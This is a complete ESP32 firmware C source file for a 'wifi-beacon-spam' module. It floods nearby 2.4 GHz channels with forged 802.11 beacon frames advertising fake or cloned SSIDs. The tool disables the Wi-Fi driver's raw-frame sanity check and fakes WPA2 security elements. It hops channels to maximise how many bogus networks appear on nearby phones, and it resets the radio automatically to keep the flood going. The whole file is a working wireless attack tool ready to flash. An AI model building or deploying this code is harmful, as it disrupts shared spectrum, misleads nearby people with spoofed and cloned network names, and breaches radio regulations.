/*
 * TheWave32 / wifi-beacon-spam
 *
 * Floods the local Wi-Fi channel with raw 802.11 beacon frames carrying
 * caller-supplied SSIDs. Each cycle iterates the SSID list, picks a fresh
 * locally-administered random BSSID per beacon, and pushes the frame
 * through esp_wifi_80211_tx. STA mode + promiscuous (the same TX path
 * wifi-deauth uses) means no virtual AP competing for airtime.
 *
 * The CLI also covers the Hydra32 "SSID Cloner" variant: `clones <base>
 * <N>` adds N copies of <base> with 0..N-1 trailing space characters,
 * which appear as distinct SSIDs to client scanners.
 */

#include <assert.h>
#include <ctype.h>
#include <inttypes.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "esp_event.h"
#include "esp_random.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"
#include "nvs_flash.h"

#include "tw32_cdc_cli.h"
#include "tw32_io.h"
#include "tw32_json_out.h"
#include "tw32_nvs_kv.h"

#define MODULE_NAME    "wifi-beacon-spam"
#define MODULE_VERSION "0.2.0"

#define MAX_SSIDS  100
#define MAX_SSID_LEN 32

int __wrap_ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c)
{ (void)a; (void)b; (void)c; return 0; }

typedef struct {
    char     ssid[MAX_SSID_LEN + 1];
    uint8_t  ssid_len;
    /* Persistent BSSID per entry. Phone scanners age out (SSID, BSSID)
     * tuples after ~30 s of silence; if we churned a fresh BSSID per
     * beacon (the previous behaviour) every tuple expired instantly
     * and the user only saw the last few survivors flicker in/out. */
    uint8_t  bssid[6];
} entry_t;

typedef struct {
    volatile bool     running;
    /* Channel state follows the sister wifi-clock-skew single-writer
     * pattern: the spammer task is the SOLE caller of esp_wifi_set_channel
     * during operation. `channel` reflects the radio's current channel
     * and is written only by the spammer (or by wifi_init_for_tx before
     * the spammer task exists). `req_channel` is the CLI's pin request;
     * the spammer applies it within one dwell when `hopping` is false. */
    volatile uint8_t  channel;
    volatile uint8_t  req_channel;
    volatile uint32_t interval_ms;
    /* Written by the spammer task, read by the CLI (different tasks):
     * atomic so the concurrent read/RMW is well defined. */
    _Atomic uint32_t  frames_sent;
    /* When advertise_wpa2 is on, every beacon includes an RSN IE and the
     * privacy bit in the capability info — clients see the SSIDs as
     * "secured" instead of "open" in their scan UI. There is no
     * association handshake here (raw beacon spam, no AP), so a real
     * client trying to connect will fail; the goal is purely cosmetic. */
    volatile bool     advertise_wpa2;
    /* Channel rotation: when on, the spammer cycles through 1..13 so
     * any phone scanner hitting a different channel from ours still
     * picks up the beacons during its dwell. Hugely improves the
     * "visible network count" on Android. */
    volatile bool     hopping;
    _Atomic uint32_t  tx_errors;
    _Atomic uint32_t  radio_resets;
    _Atomic uint32_t  last_tx_err;     /* esp_err_t of the most recent failure */
    int      count;
    entry_t  list[MAX_SSIDS];
    SemaphoreHandle_t lock;
} state_t;

static state_t s_state = { .channel = 1, .req_channel = 1, .interval_ms = 100 };

#define LOCK()   xSemaphoreTake(s_state.lock, portMAX_DELAY)
#define UNLOCK() xSemaphoreGive(s_state.lock)

/* Beacon buffer worst-case sizing, per IEEE 802.11-2020 9.3.3.3
 * (Beacon frame format) and 9.4.2.24 (RSN IE):
 *   MAC header (no QoS, no HT control)            : 24
 *   Beacon body fixed (Timestamp 8 + BcnInt 2 + Cap 2) : 12
 *   SSID IE (id 1 + len 1 + up to 32 octets)      : 34
 *   Supported Rates IE (id 1 + len 1 + 4 rates)   :  6
 *   DS Parameter Set IE (id 1 + len 1 + 1)        :  3
 *   RSN IE template (sizeof(k_rsn_ie))            : 22
 * Total worst case = 101 bytes. 128 leaves comfortable headroom. */
#define BEACON_BUF_LEN 128

/* RSN IE for WPA2-PSK / AES-CCMP, same template wpa_supplicant emits.
 *  id=0x30, len=20, version=0x0001, GroupCipher=00:0F:AC:04 (CCMP),
 *  Pairwise count=1 + suite=00:0F:AC:04, AKM count=1 + suite
 *  =00:0F:AC:02 (PSK), RSN cap=0x0000. */
static const uint8_t k_rsn_ie[] = {
    0x30, 0x14,
    0x01, 0x00,
    0x00, 0x0F, 0xAC, 0x04,
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,
    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
    0x00, 0x00,
};

/* Compile-time guard so any future IE addition that pushes the worst
 * case past BEACON_BUF_LEN fails the build instead of corrupting RAM
 * via the buf[] writes in build_beacon. */
_Static_assert(24 + 12 + (2 + MAX_SSID_LEN) + 6 + 3 + sizeof(k_rsn_ie)
               <= BEACON_BUF_LEN,
               "BEACON_BUF_LEN too small for worst-case beacon frame");

static void rand_bssid(uint8_t out[6])
{
    uint32_t r1 = esp_random();
    uint32_t r2 = esp_random();
    out[0] = (uint8_t)((r1 & 0xFC) | 0x02);  /* locally administered, unicast */
    out[1] = (uint8_t)(r1 >> 8);
    out[2] = (uint8_t)(r1 >> 16);
    out[3] = (uint8_t)r2;
    out[4] = (uint8_t)(r2 >> 8);
    out[5] = (uint8_t)(r2 >> 16);
}

static int build_beacon(uint8_t *buf, const entry_t *e, uint8_t channel,
                        uint16_t seq)
{
    int o = 0;
    /* Frame Control: type=Mgmt(0), subtype=Beacon(8) → 0x80 0x00. */
    buf[o++] = 0x80; buf[o++] = 0x00;
    /* Duration */
    buf[o++] = 0x00; buf[o++] = 0x00;
    /* DA = broadcast */
    memset(buf + o, 0xFF, 6); o += 6;
    /* SA + BSSID = the *stable* per-entry BSSID. Reusing the same
     * locally-administered MAC across every beacon for a given SSID is
     * what convinces a phone scanner to keep it on the visible-AP list
     * instead of treating each frame as a brand-new network. */
    memcpy(buf + o, e->bssid, 6); o += 6;
    memcpy(buf + o, e->bssid, 6); o += 6;
    /* Sequence */
    buf[o++] = (uint8_t)((seq & 0x0F) << 4);
    buf[o++] = (uint8_t)((seq >> 4) & 0xFF);
    /* Fixed parameters: timestamp(8) + interval(2) + capabilities(2).
     * Capability info: bit0=ESS, bit4=Privacy, bit5=ShortPreamble,
     * bit10=ShortSlotTime. Privacy bit only set when advertising WPA2. */
    memset(buf + o, 0, 8); o += 8;
    buf[o++] = 0x64; buf[o++] = 0x00;
    uint16_t cap = 0x0421;
    if (s_state.advertise_wpa2) cap |= 0x0010;   /* Privacy bit */
    buf[o++] = (uint8_t)(cap & 0xFF);
    buf[o++] = (uint8_t)(cap >> 8);
    /* IE 0: SSID */
    buf[o++] = 0x00; buf[o++] = e->ssid_len;
    memcpy(buf + o, e->ssid, e->ssid_len); o += e->ssid_len;
    /* IE 1: Supported Rates */
    buf[o++] = 0x01; buf[o++] = 0x04;
    buf[o++] = 0x82; buf[o++] = 0x84; buf[o++] = 0x8B; buf[o++] = 0x96;
    /* IE 3: DS Parameter Set (current channel) */
    buf[o++] = 0x03; buf[o++] = 0x01;
    buf[o++] = channel;
    /* RSN IE if WPA2 is being faked. */
    if (s_state.advertise_wpa2) {
        memcpy(buf + o, k_rsn_ie, sizeof(k_rsn_ie));
        o += (int)sizeof(k_rsn_ie);
    }
    return o;
}

/* Default hop set: the three non-overlapping 2.4 GHz channels. Covers
 * the vast majority of nearby APs (and therefore the channels phone
 * scanners spend most of their time on) without paying the
 * channel-switch latency on all 13. Override with `hop_chans` if a
 * deployment needs full coverage. */
static const uint8_t k_default_hop[] = {1, 6, 11};
#define DEFAULT_HOP_LEN ((int)(sizeof(k_default_hop) / sizeof(k_default_hop[0])))
#define MAX_HOP_LEN 13

static uint8_t  s_hop_chans[MAX_HOP_LEN] = {1, 6, 11};
static uint8_t  s_hop_len = DEFAULT_HOP_LEN;

/* Soft-reset the Wi-Fi stack. Used when a long run of consecutive
 * esp_wifi_80211_tx failures suggests the radio has wedged. Cheaper
 * than a full chip reset and keeps the SSID list intact. */
/* Called only from spammer_task, which is also the sole writer of
 * s_state.channel and the only caller of esp_wifi_set_channel during
 * operation, so this cannot race a CLI channel change. */
static void radio_recover(void)
{
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    uint8_t ch = s_state.channel ? s_state.channel : 1;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    s_state.radio_resets++;
}

/* Burst-mode spammer with channel dwell + auto-recovery.
 *
 * Per channel visit:
 *   1. Set channel
 *   2. Beacon every SSID in the snapshot, repeating the whole list as
 *      many times as fit inside the dwell window so the phone's own
 *      scan-channel dwell (~100 ms) always overlaps with at least one
 *      pass.
 *   3. Hop to the next channel in `s_hop_chans` (or stay if
 *      `hopping` is off).
 *
 * `interval_ms` is reused as the per-channel dwell (floor 100 ms).
 * Default hop set is {1, 6, 11} so the cycle stays short — phones see
 * each (SSID, channel) every (3 × interval_ms) ≈ 600 ms with the
 * defaults, well inside their aging window.
 *
 * Recovery: CONSECUTIVE_FAIL_LIMIT TX failures in a row → soft radio
 * reset. Keeps the SSIDs alive across the IDF blob's occasional
 * sustained-TX wedge.
 */
#define CONSECUTIVE_FAIL_LIMIT 32
#define DWELL_FLOOR_MS         100

static void spammer_task(void *arg)
{
    (void)arg;
    static uint8_t buf[BEACON_BUF_LEN];
    static entry_t snap[MAX_SSIDS];
    uint16_t seq = 0;
    uint8_t  hop_idx = 0;
    uint32_t consec_fails = 0;
    while (true) {
        if (!s_state.running) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }
        /* Snapshot SSID list and hop set together. s_hop_chans / s_hop_len
         * are written by cmd_hop_chans under the same lock, so a CLI
         * resize can never shrink s_hop_len out from under the
         * `hop_idx % s_hop_len` access below. */
        LOCK();
        int n = s_state.count;
        if (n > 0) memcpy(snap, s_state.list, (size_t)n * sizeof(entry_t));
        uint8_t hop_snap[MAX_HOP_LEN];
        uint8_t hop_snap_len = s_hop_len;
        if (hop_snap_len > 0) memcpy(hop_snap, s_hop_chans, hop_snap_len);
        bool hopping_now = s_state.hopping;
        uint8_t req_ch = s_state.req_channel ? s_state.req_channel : 1;
        UNLOCK();
        if (n == 0) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        uint8_t ch_now;
        if (hopping_now && hop_snap_len > 0) {
            if (hop_idx >= hop_snap_len) hop_idx = 0;
            ch_now = hop_snap[hop_idx];
            hop_idx = (uint8_t)((hop_idx + 1) % hop_snap_len);
        } else {
            ch_now = req_ch;
            hop_idx = 0;
        }
        if (esp_wifi_set_channel(ch_now, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
            radio_recover();
            consec_fails = 0;
            continue;
        }
        /* Sole writer of s_state.channel during operation: publish the
         * channel we just applied so cmd_stats and radio_recover see
         * truth. */
        s_state.channel = ch_now;

        uint32_t dwell = s_state.interval_ms < DWELL_FLOOR_MS
            ? DWELL_FLOOR_MS : s_state.interval_ms;
        TickType_t end = xTaskGetTickCount() + pdMS_TO_TICKS(dwell);

        /* Hammer the SSID list inside the dwell window. */
        bool wedged = false;
        while (xTaskGetTickCount() < end && s_state.running) {
            for (int i = 0; i < n && s_state.running; ++i) {
                int len = build_beacon(buf, &snap[i], ch_now, seq++);
                esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
                if (e == ESP_OK) {
                    s_state.frames_sent++;
                    consec_fails = 0;
                } else {
                    s_state.tx_errors++;
                    s_state.last_tx_err = (uint32_t)e;
                    if (++consec_fails >= CONSECUTIVE_FAIL_LIMIT) {
                        wedged = true;
                        break;
                    }
                }
                vTaskDelay(1);
            }
            if (wedged) break;
        }
        if (wedged) {
            radio_recover();
            consec_fails = 0;
        }
    }
}

static void wifi_init_for_tx(void)
{
    { esp_err_t _e = esp_event_loop_create_default();
      if (_e != ESP_OK && _e != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(_e); }
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    esp_wifi_set_ps(WIFI_PS_NONE);
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_set_channel(s_state.channel, WIFI_SECOND_CHAN_NONE));
}

/* --- CLI ---------------------------------------------------------------- */

static int add_ssid_locked(const char *ssid)
{
    size_t L = strlen(ssid);
    if (L == 0 || L > MAX_SSID_LEN) return -1;
    if (s_state.count >= MAX_SSIDS) return -2;
    entry_t *e = &s_state.list[s_state.count++];
    memcpy(e->ssid, ssid, L);
    e->ssid_len = (uint8_t)L;
    rand_bssid(e->bssid);   /* stable identity for this SSID slot */
    return 0;
}

static int cmd_add(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("add", "missing_arg"); return -1; }
    /* Re-join argv[1..] with single spaces so user can include spaces. */
    char buf[MAX_SSID_LEN + 1] = {0};
    size_t pos = 0;
    for (int i = 1; i < argc && pos < sizeof(buf) - 1; i++) {
        size_t L = strlen(argv[i]);
        if (pos + L > sizeof(buf) - 1) L = sizeof(buf) - 1 - pos;
        memcpy(buf + pos, argv[i], L); pos += L;
        if (i + 1 < argc && pos < sizeof(buf) - 1) buf[pos++] = ' ';
    }
    /* Reject ASCII control bytes. IEEE 802.11-2020 9.4.2.2 (SSID
     * element) allows arbitrary octets, but control bytes break the
     * GUI-side JSON echo (the cli wraps SSIDs into JSON strings) and
     * trip strict scanners. Stay defensive. */
    for (size_t i = 0; i < pos; i++) {
        if ((unsigned char)buf[i] < 0x20 || (unsigned char)buf[i] == 0x7F) {
            tw32_cli_ack_err("add", "bad_chars");
            return -1;
        }
    }
    int rc;
    LOCK(); rc = add_ssid_locked(buf); UNLOCK();
    if (rc == -1) tw32_cli_ack_err("add", "bad_length");
    else if (rc == -2) tw32_cli_ack_err("add", "list_full");
    else tw32_cli_ack_ok("add");
    return rc;
}

static int cmd_clear(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    LOCK(); s_state.count = 0; UNLOCK();
    tw32_cli_ack_ok("clear");
    return 0;
}

static int cmd_count(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    tw32_json_begin();
    tw32_json_kv_str("cmd", "count");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_int("count", s_state.count);
    tw32_json_end();
    return 0;
}

static int cmd_interval(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("interval", "missing_arg"); return -1; }
    long ms = strtol(argv[1], NULL, 10);
    if (ms < 50 || ms > 2000) { tw32_cli_ack_err("interval", "out_of_range"); return -1; }
    s_state.interval_ms = (uint32_t)ms;
    tw32_cli_ack_ok("interval");
    return 0;
}

static int cmd_chan(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("chan", "missing_arg"); return -1; }
    long ch = strtol(argv[1], NULL, 10);
    if (ch < 1 || ch > 14) { tw32_cli_ack_err("chan", "out_of_range"); return -1; }
    /* Record the request and disable hopping; the spammer task is the
     * sole caller of esp_wifi_set_channel during operation and will
     * apply this within one dwell. Mirrors wifi-clock-skew's cmd_chan
     * pattern so the CLI never races the IDF wifi internals against the
     * spammer's own per-dwell channel set. Takes effect after the next
     * snapshot (within ~interval_ms; floor 100 ms). */
    LOCK();
    s_state.req_channel = (uint8_t)ch;
    s_state.hopping = false;
    UNLOCK();
    tw32_cli_ack_ok("chan");
    return 0;
}

static int cmd_random(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("random", "missing_arg"); return -1; }
    long n = strtol(argv[1], NULL, 10);
    if (n < 1 || n > MAX_SSIDS) { tw32_cli_ack_err("random", "out_of_range"); return -1; }
    static const char *abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    LOCK();
    s_state.count = 0;
    for (long i = 0; i < n; i++) {
        char ssid[9];
        for (int k = 0; k < 8; k++) ssid[k] = abc[esp_random() % 62];
        ssid[8] = '\0';
        add_ssid_locked(ssid);
    }
    UNLOCK();
    tw32_cli_ack_ok("random");
    return 0;
}

static int cmd_clones(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 3) { tw32_cli_ack_err("clones", "usage: clones <base> <N>"); return -1; }
    long n = strtol(argv[2], NULL, 10);
    size_t baseL = strlen(argv[1]);
    /* baseL must be >= 1: a 0-length base produces only empty SSIDs
     * (add_ssid_locked rejects L==0), so every clone would silently
     * fail. Also bound base length so the i=0 clone fits. */
    if (n < 1 || n > MAX_SSIDS || baseL == 0 || baseL > MAX_SSID_LEN ||
        baseL + (size_t)n - 1 > MAX_SSID_LEN) {
        tw32_cli_ack_err("clones", "out_of_range"); return -1;
    }
    /* Reject control bytes in the base for the same reason as cmd_add. */
    for (size_t i = 0; i < baseL; i++) {
        unsigned char ch = (unsigned char)argv[1][i];
        if (ch < 0x20 || ch == 0x7F) {
            tw32_cli_ack_err("clones", "bad_chars");
            return -1;
        }
    }
    LOCK();
    s_state.count = 0;
    for (long i = 0; i < n; i++) {
        char buf[MAX_SSID_LEN + 1];
        memcpy(buf, argv[1], baseL);
        for (long k = 0; k < i && (baseL + (size_t)k) < MAX_SSID_LEN; k++) {
            buf[baseL + k] = ' ';
        }
        buf[baseL + i] = '\0';
        add_ssid_locked(buf);
    }
    UNLOCK();
    tw32_cli_ack_ok("clones");
    return 0;
}

static int cmd_start(tw32_cli_ctx_t *c, int argc, char **argv)
{ (void)c;(void)argc;(void)argv; s_state.running = true;  tw32_cli_ack_ok("start"); return 0; }

static int cmd_stop(tw32_cli_ctx_t *c, int argc, char **argv)
{ (void)c;(void)argc;(void)argv; s_state.running = false; tw32_cli_ack_ok("stop");  return 0; }

static int cmd_hop(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("hop", "missing_arg"); return -1; }
    if (!strcmp(argv[1], "on"))       s_state.hopping = true;
    else if (!strcmp(argv[1], "off")) s_state.hopping = false;
    else { tw32_cli_ack_err("hop", "use_on_or_off"); return -1; }
    tw32_cli_ack_ok("hop");
    return 0;
}

/* hop_chans <list>  →  set the channel rotation to the listed channels
 * (1..13). Examples:
 *   hop_chans 1 6 11           — defaults; non-overlapping coverage
 *   hop_chans 1 2 3 4 5 6 ... 13 — full coverage; longer cycle */
static int cmd_hop_chans(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2 || argc - 1 > MAX_HOP_LEN) {
        tw32_cli_ack_err("hop_chans", "usage: hop_chans <ch1> [ch2] …");
        return -1;
    }
    uint8_t newset[MAX_HOP_LEN];
    int newlen = argc - 1;
    for (int i = 0; i < newlen; i++) {
        long v = strtol(argv[i + 1], NULL, 10);
        if (v < 1 || v > 13) {
            tw32_cli_ack_err("hop_chans", "out_of_range");
            return -1;
        }
        newset[i] = (uint8_t)v;
    }
    /* Publish under s_state.lock so the spammer's snapshot copy of
     * s_hop_chans + s_hop_len is consistent (no OOB read via
     * `hop_idx % s_hop_len` if the CLI shrinks the list mid-loop). */
    LOCK();
    memcpy(s_hop_chans, newset, (size_t)newlen);
    s_hop_len = (uint8_t)newlen;
    UNLOCK();
    tw32_cli_ack_ok("hop_chans");
    return 0;
}

static int cmd_auth(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c;
    if (argc < 2) { tw32_cli_ack_err("auth", "missing_arg"); return -1; }
    if (!strcmp(argv[1], "open")) {
        s_state.advertise_wpa2 = false;
    } else if (!strcmp(argv[1], "wpa2")) {
        s_state.advertise_wpa2 = true;
    } else {
        tw32_cli_ack_err("auth", "use_open_or_wpa2"); return -1;
    }
    tw32_cli_ack_ok("auth");
    return 0;
}

static int cmd_stats(tw32_cli_ctx_t *c, int argc, char **argv)
{
    (void)c; (void)argc; (void)argv;
    tw32_json_begin();
    tw32_json_kv_str ("cmd", "stats");
    tw32_json_kv_bool("ok", true);
    tw32_json_kv_uint("frames_sent",  s_state.frames_sent);
    tw32_json_kv_uint("tx_errors",    s_state.tx_errors);
    tw32_json_kv_int ("last_tx_err",  (int)s_state.last_tx_err);
    tw32_json_kv_uint("radio_resets", s_state.radio_resets);
    tw32_json_kv_int ("ssid_count",   s_state.count);
    tw32_json_kv_uint("interval_ms",  s_state.interval_ms);
    tw32_json_kv_int ("channel",      s_state.channel);
    tw32_json_kv_bool("hopping",      s_state.hopping);
    /* Render hop_chans as "1,6,11" so the GUI can show it. Snapshot
     * under the lock so we never read a partially-overwritten set. */
    {
        uint8_t hop_snap[MAX_HOP_LEN];
        uint8_t hop_snap_len;
        LOCK();
        hop_snap_len = s_hop_len;
        if (hop_snap_len > 0) memcpy(hop_snap, s_hop_chans, hop_snap_len);
        UNLOCK();
        char hops[40] = {0};
        size_t pos = 0;
        for (int i = 0; i < hop_snap_len && pos < sizeof(hops) - 4; i++) {
            pos += snprintf(hops + pos, sizeof(hops) - pos,
                            i == 0 ? "%u" : ",%u", hop_snap[i]);
        }
        tw32_json_kv_str("hop_chans", hops);
    }
    tw32_json_kv_str ("auth",
        s_state.advertise_wpa2 ? "wpa2" : "open");
    tw32_json_kv_bool("running",      s_state.running);
    tw32_json_end();
    return 0;
}

static const tw32_cli_cmd_t cli_table[] = {
    { "add",      "add <ssid>",                    cmd_add      },
    { "clear",    "purge SSID list",               cmd_clear    },
    { "count",    "report list size",              cmd_count    },
    { "interval", "interval N (50..2000 ms)",      cmd_interval },
    { "chan",     "chan N (1..14)",                cmd_chan     },
    { "random",   "random N — replace with N rnd", cmd_random   },
    { "clones",   "clones <base> <N>",             cmd_clones   },
    { "hop",      "hop <on|off> rotate beacons across hop_chans",  cmd_hop      },
    { "hop_chans","hop_chans <ch1> [ch2] … (default: 1 6 11)",     cmd_hop_chans },
    { "auth",     "auth <open|wpa2> (cosmetic flag)", cmd_auth   },
    { "start",    "begin spamming",                cmd_start    },
    { "stop",     "halt spamming",                 cmd_stop     },
    { "stats",    "frames + state",                cmd_stats    },
};

void app_main(void)
{
    tw32_nvs_init();
    tw32_cdc_init();
    s_state.lock = xSemaphoreCreateMutex();
    configASSERT(s_state.lock);
    wifi_init_for_tx();
    xTaskCreatePinnedToCore(spammer_task, "tw32-bspam", 4096, NULL, 4, NULL, 1);
    tw32_cli_run(MODULE_NAME, MODULE_VERSION,
                 cli_table, sizeof(cli_table) / sizeof(cli_table[0]));
}
